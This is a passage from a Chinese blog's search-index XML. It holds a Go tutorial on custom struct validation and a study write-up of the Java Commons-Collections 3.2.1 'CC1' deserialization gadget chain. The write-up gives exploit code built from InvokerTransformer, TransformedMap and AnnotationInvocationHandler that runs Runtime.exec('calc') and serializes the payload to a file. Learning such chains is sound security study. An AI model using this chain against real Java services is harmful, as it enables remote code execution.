class="hljs-type">string</span>, fn Func, callValidationEvenIfNull ...<span class="hljs-type">bool</span>) <span class="hljs-type">error</span> &#123;<br>    <span class="hljs-keyword">return</span> v.RegisterValidationCtx(tag, wrapFunc(fn), callValidationEvenIfNull...)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Func</code>是一个<code>type Func func(fl FieldLevel) bool</code></p><p>这里的方法，可以写指针接收者，也可以写直接收者都是无所谓的，返回值一定需要是布尔类型，</p><p>完整代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-string">&quot;github.com/go-playground/validator/v10&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>FirstName <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;required&quot;`</span><br>LastName  <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;required&quot;`</span><br>Age       <span class="hljs-type">uint8</span>  <span class="hljs-string">`validate:&quot;validateAge&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u *User)</span></span> ValidateAge(fl validator.FieldLevel) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-comment">// 在自定义验证方法中获取字段的值</span><br><span class="hljs-keyword">return</span> fl.Field().Uint() &gt; <span class="hljs-number">4</span><br>&#125;<br><br><span class="hljs-keyword">var</span> validate *validator.Validate<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>validate = validator.New()<br>user := &amp;User&#123;<br>FirstName: <span class="hljs-string">&quot;Badger&quot;</span>,<br>LastName:  <span class="hljs-string">&quot;Smith&quot;</span>,<br>Age:       <span class="hljs-number">34</span>,<br>&#125;<br>validate.RegisterValidation(<span class="hljs-string">&quot;validateAge&quot;</span>, user.ValidateAge)<br>validateStruct(user)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validateStruct</span><span class="hljs-params">(user *User)</span></span> &#123;<br><br>err := validate.Struct(user)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>fmt.Println(err.Namespace())       <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.Field())           <span class="hljs-comment">// Age</span><br>fmt.Println(err.StructNamespace()) <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.StructField())     <span class="hljs-comment">// Age</span><br>fmt.Println(err.Tag())             <span class="hljs-comment">// lte</span><br>fmt.Println(err.ActualTag())       <span class="hljs-comment">// lte</span><br>fmt.Println(err.Kind())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Type())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Value())           <span class="hljs-comment">// 135</span><br>fmt.Println(err.Param())           <span class="hljs-comment">// 130</span><br>fmt.Println(err.Error())           <span class="hljs-comment">// Key: &#x27;User.Age&#x27; Error:Field validation for &#x27;Age&#x27; failed on the &#x27;lte&#x27; tag</span><br>fmt.Println()<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>关键点在于：</p><ol><li>tag中定义我们需要的校验方法</li><li>使用<code>RegisterValidation(tag,function) bool</code>方法注册校验方法</li></ol>]]></content>
    
    
    <categories>
      
      <category>golang开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cc1调用链2</title>
    <link href="/2023/10/27/cc1%E8%B0%83%E7%94%A8%E9%93%BE2/"/>
    <url>/2023/10/27/cc1%E8%B0%83%E7%94%A8%E9%93%BE2/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>cc1调用链</title>
    <link href="/2023/10/26/cc1%E8%B0%83%E7%94%A8%E9%93%BE1/"/>
    <url>/2023/10/26/cc1%E8%B0%83%E7%94%A8%E9%93%BE1/</url>
    
    <content type="html"><![CDATA[<h1 id="1-配置环境："><a href="#1-配置环境：" class="headerlink" title="1. 配置环境："></a>1. 配置环境：</h1><p>cc1调用链需要环境如下:</p><ul><li>jdk1.8.0_65</li><li>commons-collections 版本号为<code>3.2.1</code></li><li><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">jdk1.8_65源码</a></li></ul><ol><li>下载<code>jdk 8u65</code> <a href="https://blog.lupf.cn/articles/2022/02/19/1645283454543.html">Oracle JDK 8u65 全平台安装包下载 - 码霸霸 (lupf.cn)</a></li><li>导入坐标如下</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>解压jdk1.8.0_65下是src文件，将jdk1.8.0_65源码中的<code>src/share/clasess/sun</code>添加到你配置的1.8.0_65中的<code>src</code>目录中。</li></ol><p>教程：</p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=a015846fd4dda3664f6a3becf9028a53">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></p><h1 id="2-思路："><a href="#2-思路：" class="headerlink" title="2. 思路："></a>2. 思路：</h1><p><img src="/./../blog_image/image-20231023230226781-1698124632828-1.png" alt="image-20231023230226781"></p><p>从调用危险方法到调用顶层<code>readObject</code>实现反序列化</p><h1 id="3-探索："><a href="#3-探索：" class="headerlink" title="3. 探索："></a>3. 探索：</h1><h2 id="3-1-简单找个危险函数："><a href="#3-1-简单找个危险函数：" class="headerlink" title="3.1 简单找个危险函数："></a>3.1 简单找个危险函数：</h2><h3 id="突破口-transform方法："><a href="#突破口-transform方法：" class="headerlink" title="- 突破口 transform方法："></a>- 突破口 transform方法：</h3><p>找到一个接口，查看他的实现类</p><p><img src="/./../blog_image/image-20231023230454765.png" alt="image-20231023230454765"></p><p>找到一个<code>InvokerTranformer</code>类的<code>transform</code>方法，接收参数是可控的，即获取了当前传入obejct类，然后调用反射去调用成员变量的函数名和函数参数，找到他的构造函数</p><p><img src="/./../blog_image/image-20231023230819092.png" alt="image-20231023230819092"></p><p>第一个参数是方法名，第二个参数是参数类型，第三个参数是参数值。我们通过构造函数然后去调用<code>transform</code>方法即可调用我们传入类的方法了。</p><p>我们任意调用的方法是这样的<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>这里使用<code>InvokerTransformer</code>就是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        .transform(runtime);<br></code></pre></td></tr></table></figure><h3 id="解决Runtime不能反序列化"><a href="#解决Runtime不能反序列化" class="headerlink" title="- 解决Runtime不能反序列化"></a>- 解决Runtime不能反序列化</h3><p>找到突破口之后，我们要想<code>readObject</code>方法是反序列化才会使用，但是<code>Runtime</code>没有实现<code>SSerializable</code>方法，因此不能实现反序列化。</p><p>如何解决？Class类都是可序列化的，因此我们序列化<code>Runtime.class</code>。</p><p>查看源码发现，<code>Runtime</code>类的构造方法都是私有的，只有一个静态方法<code>getRuntime</code>返回<code>currentRuntime</code>，用到的是单例模式。因此只能反射调用<code>getRuntime</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// InvokerTransformer 传入形参会通过反射进行调用</span><br>Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeClassMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) runtimeClassMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>首先获取Runtime.class这个class对象</li><li>然后调用<code>getRuntime</code>静态方法获取当前的<code>runtimeClassMethod</code>方法。</li><li>然后使用<code>runtimeClassMethod</code>方法类去<code>invoke</code>，即调用<code>getRuntime</code>方法，<code>invoke</code>方法第一个参数是类的实例对象，第二个参数是这个方法执行的参数。因为需要<code>Runtime</code>类才能调用这个私有方法，因此第一个参数是我们上面获取到的对象。</li></ul><h2 id="3-2-TransformedMap类："><a href="#3-2-TransformedMap类：" class="headerlink" title="3.2 TransformedMap类："></a>3.2 TransformedMap类：</h2><p>上面我们查找到了调用<code>TransformedMap</code>类中的<code>checkSetValue</code>方法，我们接着网上找，发现<code>AbstractInputCheckedMapDecorator</code>类中的内部类<code>MapEntry</code>的<code>setValue</code>方法调用了他，只要我们执行map的<code>setValue</code>将我们上面的<code>Object Input</code>传入进去就可以执行了，如下：</p><p><img src="/./../blog_image/image-20231026162650565.png" alt="image-20231026162650565"></p><p>发现是<code>AbstractInputCheckedMapDecorator</code>中的<code>MapEntry</code>的<code>setValue</code>方法。</p><p><img src="/./../blog_image/image-20231026162832837.png" alt="image-20231026162832837"></p><p>编写构造链如图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">TransformedMapExp02</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// TransformedMap 这个类继承AbstractInputCheckedMapDecorator类 重写了checkSetValue 方法</span><br>    <span class="hljs-comment">// AbstractInputCheckedMapDecorator 类中的一个匿名MapEntry类调用setValue方法 回调用checkSetValue</span><br>    <span class="hljs-comment">// 尝试调用MapEntry的set方法</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    map.put(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>    <span class="hljs-keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) &#123;<br>        entry.setValue(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>继续网上查询，查找谁调用了<code>setValue()</code>方法，发现存在许多方法，我们的目的是查找<code>readObejct</code>方法，在<code>readObejct</code>方法中调用<code>setValue()</code>方法既可以实现放序列化，查找到<code>sun.reflect.annotation</code>包中的<code>AnnotationInnvocationHandler</code>的<code>readObejct</code>方法调用了<code>AbstractInputCheckedMapDecorator</code>中的<code>setVale()</code>方法。</p><p><img src="/./../blog_image/image-20231026162954726.png" alt="image-20231026162954726"></p><p>至此调用链就清楚了：</p><p><img src="/./../blog_image/image-20231026170328365.png" alt="image-20231026170328365"></p><p><code>readObjetc</code>中的判断如下：</p><p><img src="/./../blog_image/image-20231026172019179.png" alt="image-20231026172019179"></p><ol><li>将我们的map的key设置为一个注解中的成员变量，如<code>Target</code>注解存在一个成员变量<code>value</code>。</li></ol><p><img src="/./../blog_image/image-20231026172425292.png" alt="image-20231026172425292"></p><p>然后创建一个代理对象，去调用了我们熟悉的<code>AbstractInputCheckedMapDecorator</code>的<code>setValue</code>方法。</p><p><img src="/./../blog_image/image-20231026172616941.png" alt="image-20231026172616941"></p><p>因此思路在于如何修改这个<code>parent</code>对象的属性，可以没有办法。查找其他<code>transform</code>发现<code>ConstantTransformer</code>中<code>transform</code>不管输入什么都是调用他的成员变量，因此可以只要我们在创建的时候将<code>Runtime.class</code>赋值给他的成员变量，然后去调用<code>transform</code>方法就会返回<code>Runtime.class</code></p><h2 id="3-3-完整exp"><a href="#3-3-完整exp" class="headerlink" title="3.3 完整exp:"></a>3.3 完整exp:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">TransformedMapExp03</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-string">&quot;bb&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-comment">// 发现是AnnotationInvocationHandler类中调用了readObejct方法，</span><br>        <span class="hljs-comment">// readObject方法中会使用到setValue方法</span><br>        <span class="hljs-comment">// 但是AnnotationInvocationHandler这个类不是public的</span><br>        <span class="hljs-comment">// 1.使用反射去获取这个类</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aClassDeclaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>        aClassDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 创建对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">aObejct</span> <span class="hljs-operator">=</span> aClassDeclaredConstructor.newInstance(Override.class, transformedMap);<br>        <span class="hljs-comment">// 执行反序列化</span><br>        serialize(aObejct);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;a.bin&quot;</span>));<br>        stream.writeObject(o);<br>        stream.close();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;a.bin&quot;</span>));<br>        stream.readObject();<br>        stream.close();<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="4-疑惑："><a href="#4-疑惑：" class="headerlink" title="4. 疑惑："></a>4. 疑惑：</h1><h2 id="4-1-疑惑点一：为什么要加上new-ConstantTransformer-Runtime-class-？"><a href="#4-1-疑惑点一：为什么要加上new-ConstantTransformer-Runtime-class-？" class="headerlink" title="4.1 疑惑点一：为什么要加上new ConstantTransformer(Runtime.class)？"></a>4.1 疑惑点一：为什么要加上new ConstantTransformer(Runtime.class)？</h2><p>开始我们知道使用chainedTransformer中的<code>transfomer</code>方法可以方便我们去调用，我们传入多个对象就会不断循环去调用这些对象的<code>transfomer</code>方法。</p><p>如图：</p><p><img src="/./../blog_image/image-20231026174119500.png" alt="image-20231026174119500"></p><p>我们只要将我们需要传入的<code>Runtime.class</code>就可以实现我们的链路了。</p><p><img src="/./../blog_image/image-20231026174331664.png" alt="image-20231026174331664"></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul><li>视频：<a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=a015846fd4dda3664f6a3becf9028a53">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></li><li>博客：<ul><li><a href="https://www.cnblogs.com/h0cksr/p/16189755.html">java反序列化(三)CommonsCollections篇 – CC1 - h0cksr - 博客园 (cnblogs.com)</a></li><li><a href="https://blog.csdn.net/weixin_45808483/article/details/122743960">【精选】Java安全入门(二)——CC链1 分析+详解_cc1利用链_ErYao7的博客-CSDN博客</a></li><li><a href="https://xz.aliyun.com/t/12669">JAVA安全初探(三):CC1链全分析 - 先知社区 (aliyun.com)</a></li><li><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Java反序列化Commons-Collections篇01-CC1链 | Drunkbaby’s Blog (drun1baby.top)</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
